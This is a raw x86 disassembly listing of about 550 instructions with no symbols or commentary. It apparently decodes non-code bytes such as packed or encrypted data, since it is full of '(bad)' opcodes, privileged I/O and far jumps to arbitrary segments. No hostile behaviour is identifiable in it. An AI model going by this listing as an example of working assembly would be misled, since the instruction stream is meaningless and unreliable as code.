  4029a7:	push   ecx
  4029a8:	adc    edi,esp
  4029aa:	retf   0x7585
  4029ad:	arpl   WORD PTR [ebx+ecx*2-0x3b7a762c],si
  4029b4:	js     0x4029d6
  4029b6:	mov    dh,0xaf
  4029b8:	cmp    BYTE PTR ds:0x9540302b,dh
  4029be:	sub    al,0xb4
  4029c0:	(bad)  
  4029c1:	jmp    0x85ef:0x951f0ce6
  4029c8:	ror    DWORD PTR ds:0xc4b9ed95,0xa3
  4029cf:	(bad)
  4029d3:	cmp    dl,ah
  4029d5:	out    dx,eax
  4029d6:	or     cl,BYTE PTR [ecx-0x56]
  4029d9:	int3   
  4029da:	lea    edi,[edx]
  4029dc:	jmp    0x3be6:0x9a0da241
  4029e3:	repnz push ss
  4029e5:	loopne 0x402a3a
  4029e7:	lods   al,BYTE PTR ds:[esi]
  4029e8:	enter  0x3a90,0x28
  4029ec:	out    0xf2,eax
  4029ee:	jle    0x4029ec
  4029f0:	sbb    al,0x66
  4029f2:	xchg   ebx,eax
  4029f3:	aad    0xa1
  4029f5:	sub    DWORD PTR [ebp+0x1a733f59],esp
  4029fb:	mov    esi,0xc80c1e69
  402a00:	fisttp WORD PTR [ecx-0x5deda86a]
  402a06:	mov    ds:0x2b59ce05,al
  402a0b:	nop
  402a0c:	(bad)  
  402a0d:	push   esp
  402a0e:	(bad)  [ecx]
  402a10:	fs test al,0xe6
  402a13:	jae    0x40299b
  402a15:	inc    bh
  402a17:	mov    cl,0x89
  402a19:	adc    ebp,ebx
  402a1b:	sub    esp,ebx
  402a1d:	gs cld 
  402a1f:	cmp    dl,BYTE PTR [ebx+ebp*2+0x1037f9a6]
  402a26:	js     0x402a8c
  402a28:	push   0xffffffc5
  402a2a:	mov    ebp,0x9b419011
  402a2f:	mov    cl,0x13
  402a31:	sbb    ebp,eax
  402a33:	das    
  402a34:	ins    DWORD PTR es:[edi],dx
  402a35:	loope  0x402a2e
  402a37:	sbb    dl,0x43
  402a3a:	xchg   edx,eax
  402a3b:	lahf   
  402a3c:	inc    edi
  402a3d:	cmp    DWORD PTR [edi-0x6736ef8b],ebp
  402a43:	adc    BYTE PTR [esi+ebp*2+0x48],dl
  402a47:	jno    0x4029d8
  402a49:	cmp    eax,0xc693f437
  402a4e:	(bad)  [eax]
  402a50:	nop
  402a51:	hlt    
  402a52:	and    eax,0x15b8d0a7
  402a57:	aaa    
  402a58:	ins    BYTE PTR es:[edi],dx
  402a59:	popf   
  402a5a:	pop    ecx
  402a5b:	neg    BYTE PTR [ebp+0x4c]
  402a5e:	pop    edx
  402a5f:	seto   al
  402a62:	push   esp
  402a63:	mov    ah,0x2b
  402a65:	callw  0xbdb7
  402a69:	ret    0xd2c4
  402a6c:	mov    cl,0x75
  402a6e:	add    DWORD PTR [eax],esi
  402a70:	mov    dl,0x89
  402a72:	nop
  402a73:	sbb    ch,BYTE PTR [ebp-0x1e9f6137]
  402a79:	jnp    0x402a13
  402a7b:	cwde   
  402a7c:	sbb    ah,BYTE PTR [ebp-0x3b]
  402a7f:	shl    DWORD PTR [ebx+0x64],cl
  402a82:	mov    eax,ds:0xe76c1de1
  402a87:	repnz enter 0x41a6,0x95
  402a8c:	xchg   edi,eax
  402a8d:	xchg   ebp,eax
  402a8e:	jo     0x402a16
  402a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a91:	xor    DWORD PTR [edx-0x66],esi
  402a94:	stc    
  402a95:	rcl    edi,1
  402a97:	mov    edi,0x3a25e24f
  402a9c:	push   esp
  402a9d:	jle    0x402a4f
  402a9f:	mov    bl,0x2a
  402aa1:	sub    BYTE PTR [esi-0x12e6fcc1],cl
  402aa7:	push   edx
  402aa8:	fs push edx
  402aaa:	xor    eax,ecx
  402aac:	fisub  DWORD PTR [ebp-0x6551399f]
  402ab2:	push   esi
  402ab3:	sub    ecx,DWORD PTR [ebp+0x25aa492b]
  402ab9:	pop    ds
  402aba:	pop    ecx
  402abb:	sti    
  402abc:	pop    esi
  402abd:	sbb    BYTE PTR [ecx],cl
  402abf:	push   esi
  402ac0:	int    0x99
  402ac2:	in     eax,dx
  402ac3:	push   eax
  402ac4:	data16 fs out 0xc,al
  402ac8:	sbb    DWORD PTR ds:0x31d8045b,esi
  402ace:	(bad)  
  402acf:	pop    esi
  402ad0:	cs cli 
  402ad2:	mov    BYTE PTR fs:[ebx-0x5d2a1faa],ch
  402ad9:	outs   dx,DWORD PTR ds:[esi]
  402ada:	push   eax
  402adb:	(bad)  
  402adc:	push   edx
  402add:	retf   0x6b2f
  402ae0:	or     dl,al
  402ae2:	repnz outs dx,BYTE PTR ds:[esi]
  402ae4:	fcomi  st,st(1)
  402ae6:	pushf  
  402ae7:	or     al,0xb1
  402ae9:	aas    
  402aea:	sub    BYTE PTR [edi+0x2d0e6b4b],ah
  402af0:	adc    BYTE PTR [ebx+0xa61e282],dh
  402af6:	sub    bh,BYTE PTR [edi]
  402af8:	xchg   BYTE PTR [esi],bl
  402afa:	div    esi
  402afc:	outs   dx,BYTE PTR ds:[esi]
  402afd:	jp     0x402ac3
  402aff:	fwait
  402b00:	(bad)  
  402b01:	dec    dl
  402b03:	shl    DWORD PTR [esi],0xf8
  402b06:	push   0xc75d9166
  402b0b:	adc    esp,DWORD PTR [edx-0x39e4c75]
  402b11:	jge    0x402aa2
  402b13:	daa    
  402b14:	das    
  402b15:	cmp    eax,0xa423a615
  402b1a:	dec    ebp
  402b1b:	mov    DWORD PTR [ebx],esp
  402b1d:	loope  0x402b7e
  402b1f:	xchg   edx,eax
  402b20:	cs popa 
  402b22:	jmp    0x402b44
  402b24:	arpl   WORD PTR [esi+0x5cb5dcaa],si
  402b2a:	mov    eax,0xf58b612a
  402b2f:	dec    esi
  402b30:	fdivr  QWORD PTR ds:0x4105758a
  402b36:	pop    edi
  402b37:	push   ecx
  402b38:	sbb    eax,0x6415aeed
  402b3d:	pop    edx
  402b3e:	data16 shl dh,1
  402b41:	mov    eax,0xc5fafda
  402b46:	pop    ds
  402b47:	int3   
  402b48:	adc    dh,BYTE PTR [ebx+0x4e]
  402b4b:	fsubr  DWORD PTR [ebx]
  402b4d:	push   0xffffff8d
  402b4f:	(bad)  
  402b50:	jns    0x402b58
  402b52:	cmp    eax,0xb3075929
  402b57:	xor    esi,esi
  402b59:	mov    edx,DWORD PTR [ebp-0x33636259]
  402b5f:	mov    eax,ebx
  402b61:	icebp  
  402b62:	inc    ecx
  402b63:	mov    edi,0x36ab3d92
  402b68:	mov    eax,0xa05635a1
  402b6d:	inc    ecx
  402b6e:	push   ds
  402b6f:	mov    DWORD PTR [eax],esi
  402b71:	inc    ecx
  402b72:	cs mov ebx,0x6704bc8c
  402b78:	jge    0x402b00
  402b7a:	ret    
  402b7b:	and    DWORD PTR [edx+ebp*8+0x2a],esi
  402b7f:	out    0x11,al
  402b81:	ja     0x402bd0
  402b83:	gs dec esi
  402b85:	xor    ch,ah
  402b87:	mov    ebp,0x56d9cd93
  402b8c:	lahf   
  402b8d:	add    ebp,DWORD PTR [ebp-0x1719932a]
  402b93:	sub    ah,BYTE PTR [ebx+ebp*2-0x79]
  402b97:	jge    0x402bc3
  402b99:	fdivp  st(5),st
  402b9b:	retf   
  402b9c:	stos   BYTE PTR es:[edi],al
  402b9d:	test   DWORD PTR [esi+edx*2+0x6951944e],esi
  402ba4:	mov    dh,0xe3
  402ba6:	aas    
  402ba7:	adc    cl,BYTE PTR [esi+0x2f2be556]
  402bad:	xchg   ecx,eax
  402bae:	add    al,0xf7
  402bb0:	xor    DWORD PTR [eax+0x1ca05f5d],edi
  402bb6:	sbb    ebx,DWORD PTR [ebp+esi*8-0x15]
  402bba:	aas    
  402bbb:	nop
  402bbc:	addr16 imul edi,edx,0x8b478c51
  402bc3:	mov    BYTE PTR [edi+0x52],bl
  402bc6:	fiadd  WORD PTR [edx]
  402bc8:	mov    WORD PTR [edi-0x7a],gs
  402bcb:	in     eax,0x91
  402bcd:	aam    0x9d
  402bcf:	xor    al,BYTE PTR [ebp+ebx*8+0x7f8e01fe]
  402bd6:	and    cl,BYTE PTR [ecx+0x27f88033]
  402bdc:	sbb    ebp,DWORD PTR [edx]
  402bde:	ror    BYTE PTR [ebp+ebx*1+0x47],cl
  402be2:	jg     0x402b92
  402be4:	xor    eax,0x118e2b47
  402be9:	push   cs
  402bea:	mov    ch,0xf1
  402bec:	in     al,dx
  402bed:	fst    DWORD PTR [ebx+ebp*1+0x24]
  402bf1:	sbb    al,0xb9
  402bf3:	dec    ebp
  402bf4:	(bad)  
  402bf5:	repz and ebp,DWORD PTR [edi]
  402bf8:	clc    
  402bf9:	jg     0x402b82
  402bfb:	add    BYTE PTR ds:0xcf3c74a3,dl
  402c01:	jmp    0xd287:0x5707ea1d
  402c08:	jno    0x402c6f
  402c0a:	scas   eax,DWORD PTR es:[edi]
  402c0b:	in     eax,0x7c
  402c0d:	fs and esp,edx
  402c10:	jle    0x402c00
  402c12:	ret    0x51d1
  402c15:	fadd   QWORD PTR [ebp+0x49]
  402c18:	scas   eax,DWORD PTR es:[edi]
  402c19:	fwait
  402c1a:	scas   eax,DWORD PTR es:[edi]
  402c1b:	hlt    
  402c1c:	xchg   esi,eax
  402c1d:	addr16 mov eax,0x952c8f87
  402c23:	ss in  al,0xa1
  402c26:	jl     0x402bee
  402c28:	inc    edx
  402c29:	nop
  402c2a:	pusha  
  402c2b:	mov    edx,0x292dcc0d
  402c30:	xchg   esi,eax
  402c31:	mov    al,BYTE PTR [esi-0x197de04a]
  402c37:	call   0x555b:0x274b72f8
  402c3e:	jno    0x402caf
  402c40:	fdiv   QWORD PTR [edi]
  402c42:	ins    BYTE PTR es:[edi],dx
  402c43:	cmp    al,0xcc
  402c45:	std    
  402c46:	jl     0x402bd6
  402c48:	xor    al,0x71
  402c4a:	addr16 mov ds:0x3139,al
  402c4e:	cmp    al,0x82
  402c50:	push   0x4d42aa1
  402c55:	jbe    0x402ccd
  402c57:	inc    esp
  402c58:	dec    eax
  402c59:	loopne 0x402c92
  402c5b:	push   ecx
  402c5c:	mov    bh,0x25
  402c5e:	mov    eax,ds:0xa4966114
  402c63:	fcmovne st,st(1)
  402c65:	lods   eax,DWORD PTR ds:[esi]
  402c66:	cvtps2pi mm0,QWORD PTR [edi+esi*1+0x6b]
  402c6b:	fist   WORD PTR [edx]
  402c6d:	or     edi,DWORD PTR [eax+0x528a4af1]
  402c73:	add    ch,bh
  402c75:	sbb    ch,BYTE PTR [edi-0x1a]
  402c78:	jo     0x402c46
  402c7a:	mov    esi,0xcf1396c5
  402c7f:	icebp  
  402c80:	inc    edx
  402c81:	mov    esp,0x7b9a30ff
  402c86:	jns    0x402cfa
  402c88:	sar    BYTE PTR [eax],cl
  402c8a:	test   DWORD PTR [ecx-0x153e680a],edx
  402c90:	repz fisubr DWORD PTR [esi+0x4e]
  402c94:	fs add ah,0x42
  402c98:	inc    eax
  402c99:	loop   0x402ca2
  402c9b:	push   ebp
  402c9c:	mov    edi,0x337f84cb
  402ca1:	cmp    bh,BYTE PTR [ebp-0x5294fa38]
  402ca7:	rol    DWORD PTR [ebx+0x37],1
  402caa:	push   0xffffffe9
  402cac:	loopne 0x402d17
  402cae:	enter  0x527a,0x50
  402cb2:	cmp    ebp,DWORD PTR [ecx]
  402cb4:	stos   DWORD PTR es:[edi],eax
  402cb5:	ficom  DWORD PTR [ebx+0x4b820359]
  402cbb:	mov    edi,0x8b3787af
  402cc0:	pushf  
  402cc1:	arpl   WORD PTR [ebx+0x12],dx
  402cc4:	test   eax,0x6607a49d
  402cc9:	sar    edi,0x6f
  402ccc:	mov    ch,0xa1
  402cce:	cmp    eax,0x57056f20
  402cd3:	in     al,dx
  402cd4:	pop    eax
  402cd5:	adc    eax,0x80d23f87
  402cda:	mov    edi,0x46b3e18c
  402cdf:	mov    cx,0xcf8b
  402ce3:	ds ins BYTE PTR es:[edi],dx
  402ce5:	adc    ah,ah
  402ce7:	call   0x68d8:0x517bff8c
  402cee:	mov    eax,ds:0x1bc339a9
  402cf3:	test   DWORD PTR [ecx+eiz*4+0xe],eax
  402cf7:	cmp    edx,DWORD PTR [ebx+0x158860e4]
  402cfd:	dec    DWORD PTR [esi]
  402cff:	int3   
  402d00:	xchg   ebx,eax
  402d01:	int    0x1c
  402d03:	rcl    BYTE PTR [ebx+0x690d27fd],0xea
  402d0a:	add    ebp,DWORD PTR [edx+eax*2]
  402d0d:	popf   
  402d0e:	cmp    DWORD PTR [eax+0x59],ebp
  402d11:	lahf   
  402d12:	das    
  402d13:	push   edx
  402d14:	out    0x70,eax
  402d16:	mov    dl,0x29
  402d18:	inc    edi
  402d19:	jge    0x402d29
  402d1b:	in     eax,0xe2
  402d1d:	inc    esi
  402d1e:	mov    cl,0xef
  402d20:	adc    BYTE PTR [ebx+0x3041ceac],0xf
  402d27:	push   es
  402d28:	pop    eax
  402d29:	inc    edi
  402d2a:	mov    dl,BYTE PTR [esi]
  402d2c:	out    0xb3,eax
  402d2e:	leave  
  402d2f:	mov    WORD PTR [ebp-0x21],es
  402d32:	jge    0x402d51
  402d34:	out    0x4c,eax
  402d36:	das    
  402d37:	xchg   edi,eax
  402d38:	inc    edi
  402d39:	and    BYTE PTR [edx+0x7e0d4ff4],0x87
  402d40:	xchg   esi,eax
  402d41:	js     0x402d6a
  402d43:	or     dl,dh
  402d45:	fist   DWORD PTR [esp+edx*1+0x66]
  402d49:	(bad)  
  402d4a:	cmp    ebp,DWORD PTR [eax+0x10]
  402d4d:	inc    eax
  402d4e:	pushf  
  402d4f:	outs   dx,BYTE PTR ds:[esi]
  402d50:	mov    dl,0xc1
  402d52:	push   ebx
  402d53:	add    dl,BYTE PTR [edx+eiz*8+0x18]
  402d57:	mov    edi,0x62c1799c
  402d5c:	cmp    al,0x64
  402d5e:	push   ecx
  402d5f:	popf   
  402d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d61:	and    esp,ebp
  402d63:	jmp    0x402db2
  402d65:	xchg   esi,eax
  402d66:	sti    
  402d67:	push   eax
  402d68:	fisubr DWORD PTR [ebx+0x66]
  402d6b:	inc    esi
  402d6c:	xor    al,0x5a
  402d6e:	(bad)  
  402d6f:	out    0x62,al
  402d71:	lods   eax,DWORD PTR ds:[esi]
  402d72:	mov    ds:0x7b21330f,al
  402d77:	je     0x402db3
  402d79:	test   BYTE PTR [edx-0x54],al
  402d7c:	pop    DWORD PTR [ebx-0x3e]
  402d7f:	adc    edx,ebx
  402d81:	jne    0x402d82
  402d83:	dec    ecx
  402d84:	(bad)  
  402d85:	div    BYTE PTR [eax+0x5043fc]
  402d8b:	aad    0x97
  402d8d:	sub    BYTE PTR [edi+0x4c],al
  402d90:	or     DWORD PTR [ebx+0x56e4e03c],ebp
  402d96:	mov    ecx,edx
  402d98:	cmp    DWORD PTR [eax-0x30],0x1947cff7
  402d9f:	jge    0x402e08
  402da1:	dec    ecx
  402da2:	std    
  402da3:	call   0x31b1:0x58fd09d2
  402daa:	push   edx
  402dab:	or     al,0xe9
  402dad:	or     ch,BYTE PTR [ebp-0x58cc48ef]
  402db3:	push   esp
  402db4:	push   esp
  402db5:	sbb    dl,BYTE PTR [edx+esi*1+0x8c641bf]
  402dbc:	dec    edi
  402dbd:	or     bh,cl
  402dbf:	adc    eax,0x6493747b
  402dc4:	daa    
  402dc5:	sub    ch,BYTE PTR [esi+0x76]
  402dc8:	out    0x46,eax
  402dca:	push   esp
  402dcb:	rcr    DWORD PTR [edx-0x14cd77d3],cl
  402dd1:	(bad)  
  402dd2:	mov    edi,0x6c43e7ce
  402dd7:	into   
  402dd8:	jb     0x402d65
  402dda:	sti    
  402ddb:	xor    bl,BYTE PTR fs:[ebp-0x20]
  402ddf:	mov    edi,0x483a5ca
  402de4:	dec    ebp
  402de5:	fild   DWORD PTR [ebx]
  402de7:	jne    0x402e09
  402de9:	scas   al,BYTE PTR es:[edi]
  402dea:	dec    edx
  402deb:	adc    eax,DWORD PTR [eax+eiz*1+0x2629e613]
  402df2:	inc    esi
  402df3:	pop    DWORD PTR [esi+0x15]
  402df6:	pop    ss
  402df7:	and    BYTE PTR [edx+0x25],ch
  402dfa:	push   edi
  402dfb:	stos   DWORD PTR es:[edi],eax
  402dfc:	pop    ebx
  402dfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dfe:	outs   dx,BYTE PTR ds:[esi]
  402dff:	cmp    al,0x13
  402e01:	fldcw  WORD PTR [edi+0x53948f84]
  402e07:	repz pop ds
  402e09:	sbb    eax,0xb8cf1c14
  402e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e0f:	jmp    0x402def
  402e11:	or     eax,0xcdf31c36
  402e16:	xchg   esi,eax
  402e17:	adc    DWORD PTR [edi+0x35],eax
  402e1a:	push   es
  402e1b:	sar    BYTE PTR [edi-0xd],0xa3
  402e1f:	mov    edi,0x1c343860
  402e24:	and    eax,0x9a09094d
  402e29:	push   edi
  402e2a:	xchg   ecx,eax
  402e2b:	sbb    BYTE PTR [ecx],al
  402e2d:	retf   0x6d4c
  402e30:	push   ds
  402e31:	push   esp
  402e32:	les    esp,FWORD PTR [edx+0x3e]
  402e35:	scas   al,BYTE PTR es:[edi]
  402e36:	pop    esp
  402e37:	outs   dx,BYTE PTR ds:[esi]
  402e38:	rcr    BYTE PTR [edx+0x3f0b001a],1
  402e3e:	in     eax,0xc4
  402e40:	push   esp
  402e41:	mov    BYTE PTR [eax-0x7d],cl
  402e44:	mov    DWORD PTR [edi],esp
  402e46:	in     eax,0xac
  402e48:	neg    BYTE PTR [eax+esi*2-0x23]
  402e4c:	sbb    eax,0x2673b28d
  402e51:	mov    ds:0x5bb82099,al
  402e56:	xor    al,0x80
  402e58:	lds    edx,FWORD PTR [ecx+0x5095d5dd]
  402e5e:	fisub  WORD PTR [ebp-0x57ce65da]
  402e64:	ins    DWORD PTR es:[edi],dx
  402e65:	jl     0x402e8b
  402e67:	es jp  0x402ebb
  402e6a:	adc    DWORD PTR [ecx-0x3b],edx
  402e6d:	test   BYTE PTR [ebx+0x72],cl
  402e70:	push   esp
  402e71:	dec    esi
  402e72:	or     DWORD PTR [ecx-0x636242e9],ebp
  402e78:	aam    0xde
  402e7a:	inc    ecx
  402e7b:	sbb    DWORD PTR [edx+ecx*1-0x12],0x10
  402e80:	jg     0x402e71
  402e82:	fidiv  DWORD PTR [esp+eiz*4+0x2e]
  402e86:	adc    esp,ebp
  402e88:	xlat   BYTE PTR ds:[ebx]
  402e89:	inc    esp
  402e8a:	or     al,0x1b
  402e8c:	xchg   ebp,eax
  402e8d:	dec    esi
  402e8e:	inc    ebx
  402e8f:	test   edi,edi
  402e91:	push   0xffffffcf
  402e93:	call   0x6ca3cc83
  402e98:	leave  
  402e99:	test   BYTE PTR [edx+0x6de75353],0x75
  402ea0:	add    al,0xb5
  402ea2:	push   es
  402ea3:	sbb    eax,0x5e01c4a1
  402ea8:	dec    eax
  402ea9:	icebp  
  402eaa:	push   ds
  402eab:	outs   dx,BYTE PTR ds:[esi]
  402eac:	add    ah,BYTE PTR [edi+0x41]
  402eaf:	jns    0x402e84
  402eb1:	fwait
  402eb2:	push   edi
  402eb3:	ret    
  402eb4:	in     al,dx
  402eb5:	xor    DWORD PTR [eax+0x5],0xc2d8f76c
  402ebc:	or     cl,BYTE PTR [ebp+0x6e]
  402ebf:	test   DWORD PTR [edx-0x67],edi
  402ec2:	fisub  WORD PTR [edi+0x4e]
  402ec5:	or     al,0x6b
  402ec7:	mov    edi,0xd09b4409
  402ecc:	mov    ds:0xfceebf5e,eax
  402ed1:	pop    eax
  402ed2:	jmp    0xf384:0xb502e954
  402ed9:	mov    bh,0xf3
  402edb:	or     BYTE PTR [eax+0x6b],ah
  402ede:	push   0x8b567d9f
  402ee3:	inc    eax
  402ee4:	retf   0x9d24
  402ee7:	lea    esp,[ebp-0x9]
  402eea:	mov    al,ds:0x9f20092c
  402eef:	xchg   edi,eax
  402ef0:	push   ecx
  402ef1:	push   cs
  402ef2:	or     BYTE PTR [ebx-0x26],dl
  402ef5:	and    BYTE PTR [esi+0x7f80d0b1],ah
  402efb:	jne    0x402ec2
  402efd:	test   al,cl
  402eff:	rcr    bh,1
  402f01:	mov    bh,BYTE PTR [edi-0x58bbcfc3]
  402f07:	jmp    0x608fa3c4
  402f0c:	pusha  
  402f0d:	rol    DWORD PTR [edx],0xc9
  402f10:	or     dh,bh
  402f12:	cmp    al,0xcf
  402f14:	sbb    edi,esp
  402f16:	pcmpgtb mm5,mm2
  402f19:	add    ah,cl
  402f1b:	xor    BYTE PTR ss:[ebp+0x43ebdc6c],al
  402f22:	sbb    dh,0x1b
  402f25:	xchg   esi,eax
  402f26:	ja     0x402f3e
  402f28:	xchg   edx,eax
  402f29:	test   BYTE PTR [esi-0x22],bl
  402f2c:	jo     0x402ed7
  402f2e:	icebp  
  402f2f:	add    ebx,ebp
  402f31:	or     ch,0x99
  402f34:	sub    DWORD PTR [ecx+0x494a792c],eax
  402f3a:	mov    ebx,0x68fccd8
  402f3f:	mov    ?,WORD PTR [ebx+0x7f6ebbbc]
  402f45:	push   eax
  402f46:	cmc    
  402f47:	fwait
  402f48:	out    dx,al
  402f49:	xchg   ebp,eax
  402f4a:	sti    
  402f4b:	mov    ch,ch
  402f4d:	adc    cl,BYTE PTR [ebx]
  402f4f:	add    eax,0xf859e50e
  402f54:	gs std 
  402f56:	in     al,0x43
  402f58:	and    edi,esi
  402f5a:	in     al,0x45
  402f5c:	dec    ebx
  402f5d:	push   edx
  402f5e:	and    BYTE PTR [edx],al
  402f60:	adc    cl,al
  402f62:	std    
  402f63:	add    al,0xce
  402f65:	pusha  
  402f66:	(bad)  
  402f67:	test   eax,0x678b97cf
  402f6c:	dec    eax
  402f6d:	inc    ebp
  402f6e:	adc    ebx,DWORD PTR [ebx+0x37]
  402f71:	jo     0x402ef5
  402f73:	jns    0x402f02
  402f75:	mov    eax,ds:0xf237cfac
  402f7a:	fcom   QWORD PTR cs:[edx-0x37]
  402f7e:	stos   BYTE PTR es:[edi],al
  402f7f:	or     eax,0xbf64ba6e
  402f84:	pop    edx
  402f85:	adc    esi,DWORD PTR [ebx]
  402f87:	retf   
  402f88:	mov    ebp,0x9b1f547c
  402f8d:	rcr    ecx,cl
  402f8f:	aam    0x67
  402f91:	pop    esp
  402f92:	dec    eax
  402f93:	xchg   ecx,eax
  402f94:	push   ecx
  402f95:	cld    
  402f96:	gs sub eax,0x48062860
  402f9c:	xchg   esp,eax
  402f9d:	lock sub DWORD PTR [eax],0x67
  402fa1:	sbb    BYTE PTR [ebp-0x3e],0x19
  402fa5:	test   DWORD PTR [ecx+edi*4],eax
  402fa8:	adc    ebx,DWORD PTR [esi+0x7e]
  402fab:	dec    esp
  402fac:	and    DWORD PTR [ebx-0x53981333],0x5d936796
  402fb6:	inc    ebx
  402fb7:	jbe    0x403032
  402fb9:	sub    ah,BYTE PTR [ebx]
  402fbb:	bound  esp,QWORD PTR [ecx-0x2c490f0b]
  402fc1:	jb     0x402f9c
  402fc3:	xchg   ecx,eax
  402fc4:	daa    
  402fc5:	sub    al,0x13
  402fc7:	adc    al,0x34
  402fc9:	call   0x909c:0x33146be8
  402fd0:	dec    edi
  402fd1:	addr16 pop ecx
  402fd3:	ins    DWORD PTR es:[edi],dx
  402fd4:	pop    ebx
  402fd5:	push   0x31c683d9
  402fda:	xor    eax,eax
  402fdc:	and    ebx,DWORD PTR ds:[ecx]
  402fdf:	enter  0xc05a,0x95
  402fe3:	lock in eax,dx
  402fe5:	fucomip st,st(4)
  402fe7:	add    ecx,DWORD PTR [ecx+0x78aa0774]
  402fed:	adc    eax,0x2ff8572a
  402ff2:	cmp    al,0xc6
  402ff4:	push   ss
  402ff5:	stos   BYTE PTR es:[edi],al
  402ff6:	iret   
  402ff7:	aam    0xf9
  402ff9:	mov    ds:0x797011bf,eax
  402ffe:	inc    ebp
  402fff:	retf   
  403000:	call   0x2658668d
  403005:	sbb    al,0x38
  403007:	ret    0x4a6b
  40300a:	inc    ebp
  40300b:	xchg   edi,eax
  40300c:	mov    esi,0xcf5a777a
  403011:	jp     0x40304f
  403013:	call   0x792bdadc
  403018:	inc    esp
  403019:	push   ss
  40301a:	xor    dl,BYTE PTR [esi+ecx*8-0x3ddd6a40]
  403021:	jno    0x402fcf
  403023:	jg     0x403027
  403025:	dec    eax
  403026:	xchg   ebx,eax
  403027:	xor    DWORD PTR [ebp-0x35193af5],ebp
  40302d:	jne    0x402ffb
  40302f:	iret   
  403030:	inc    esi
  403031:	cdq    
  403032:	dec    edx
  403033:	jle    0x40304c
  403035:	pop    esi
  403036:	xlat   BYTE PTR ds:[ebx]
  403037:	mov    fs,WORD PTR [ebx-0x5453db71]
  40303d:	cli    
  40303e:	adc    al,BYTE PTR [eax+ebp*4]
  403041:	(bad)  
  403043:	mov    esi,esi
  403045:	mov    ah,0xb2
  403047:	in     al,0xa9
  403049:	jmp    DWORD PTR [eax+0x3a9b3fc5]
  40304f:	mov    ah,0xf4
  403051:	mov    DWORD PTR ds:0x7a754c69,esp
  403057:	popf   
  403058:	push   ebx
  403059:	arpl   WORD PTR [ebx],bp
  40305b:	imul   eax,DWORD PTR [edi-0x44],0xb286ae07
  403062:	xchg   ebp,eax
  403063:	push   0xc70329b8
  403068:	adc    ebp,DWORD PTR ds:0x125a722d
  40306e:	ins    BYTE PTR es:[edi],dx
  40306f:	adc    al,cl
  403071:	sub    al,0x80
  403073:	push   cs
  403074:	ins    BYTE PTR es:[edi],dx
  403075:	sbb    edi,eax
  403077:	in     al,0x1c
  403079:	cs (bad) 
  40307b:	rcl    DWORD PTR [ebx+eax*1-0x7e],1
  40307f:	mov    cl,0x9
  403081:	ins    BYTE PTR es:[edi],dx
  403082:	add    al,0xa
  403084:	or     DWORD PTR [ebp+0x53],0x24476b2d
  40308b:	push   ss
  40308c:	arpl   cx,bp
  40308e:	xchg   BYTE PTR [ecx+0x1e],ch
  403091:	bound  ebp,QWORD PTR [ebx]
  403093:	inc    ebx
  403094:	repz repz in eax,0xab
  403098:	add    DWORD PTR ds:0x8a26edde,eax
  40309e:	and    DWORD PTR [edx+ebp*4+0x5895766d],ebp
  4030a5:	sbb    ch,BYTE PTR gs:[eax+0x1707b9bc]
  4030ac:	aaa    
  4030ad:	cmp    dh,BYTE PTR [edx-0x2e611108]
  4030b3:	int    0xde
  4030b5:	push   ebx
  4030b6:	in     al,0x13
  4030b8:	push   ds
  4030b9:	mov    bl,0x82
  4030bb:	bound  esp,QWORD PTR [ecx+0x34e0c6c4]
  4030c1:	adc    dh,BYTE PTR [ecx+0x44435b44]
  4030c7:	stos   BYTE PTR es:[edi],al
  4030c8:	xor    bl,BYTE PTR [esi-0x6b303752]
  4030ce:	mov    ah,0x50
  4030d0:	lahf   
  4030d1:	xchg   edx,eax
  4030d2:	dec    BYTE PTR [esi+esi*4-0x7c]
  4030d6:	jmp    0x274e:0xa4547dac
  4030dd:	stos   DWORD PTR es:[edi],eax
  4030de:	jo     0x403115
  4030e0:	cmp    DWORD PTR [edx-0x2737564f],0x3b
  4030e7:	mov    edi,0x58d888b8
  4030ec:	outs   dx,DWORD PTR ds:[esi]
  4030ed:	jmp    0x1a3c:0x4cd189db
  4030f4:	int3   
  4030f5:	mov    WORD PTR [edi-0x36],cs
  4030f8:	mov    esp,0xb1f5c4a7
  4030fd:	mov    DWORD PTR [edx-0x3c841e55],edx
  403103:	jmp    0xe483:0x1a4256c0
  40310a:	jb     0x4030fe
  40310c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40310d:	pop    ecx
  40310e:	mov    edi,0x63184a0
  403113:	lahf   
  403114:	imul   esp,DWORD PTR [ecx],0x1
  403117:	dec    ebp
  403118:	adc    BYTE PTR [edx+ebp*1-0x7289889],bh
  40311f:	pop    ss
  403120:	pop    ebp
  403121:	popa   
  403122:	sar    edx,1
  403124:	retf   
  403125:	dec    ebp
  403126:	xor    BYTE PTR [edi-0x2f7de6f4],dh
  40312c:	inc    esi
  40312d:	sti    
  40312e:	or     ebx,DWORD PTR [ebp+ebx*8+0x2a7929e1]
  403135:	xchg   esp,eax
  403136:	popf   
  403137:	addr16 xchg ebp,eax
  403139:	xchg   edx,eax
  40313a:	and    al,0xd9
  40313c:	cmp    DWORD PTR [eax-0x46],0xda43fab2
  403143:	int    0x8c
  403145:	adc    BYTE PTR [edx],0xc0
  403148:	call   0xb039e666
  40314d:	inc    DWORD PTR [ecx+0xa]
  403150:	and    dh,ah
  403152:	adc    esi,DWORD PTR [edi-0x65]
  403155:	(bad)  
  403156:	out    dx,al
  403157:	mov    edi,0x4c87cce0
  40315c:	retf   0xff94
  40315f:	int    0x5d
  403161:	(bad)  
  403163:	dec    esi
  403164:	cmp    al,0x61
  403166:	and    cl,BYTE PTR [esi+eiz*8+0x79b730fa]
  40316d:	lea    ebx,[ebx+edi*4+0x326e1026]
  403174:	cmp    BYTE PTR [ebp+0xf],ah
  403177:	jne    0x40310f
  403179:	retf   
  40317a:	push   edx
  40317b:	push   ss
  40317c:	xor    DWORD PTR [ecx-0x7d40e83c],esi
  403182:	mov    DWORD PTR [ebx],edi
  403184:	dec    esp
  403185:	aas    
  403186:	call   0x64d0:0x896c685c
  40318d:	push   esi
  40318e:	(bad)  
  40318f:	jmp    0x5721:0x1ccdd12
  403196:	mov    ah,0xd5
  403198:	pop    edx
  403199:	mov    ah,0x42
  40319b:	imul   ecx,DWORD PTR [ebx+0x71],0xffffff94
  40319f:	adc    al,0x6
  4031a1:	and    bl,al
  4031a3:	push   0xffffff92
  4031a5:	sbb    ch,al
  4031a7:	mov    WORD PTR [ecx+0x4197dde1],ds
  4031ad:	adc    al,0x53
  4031af:	leave  
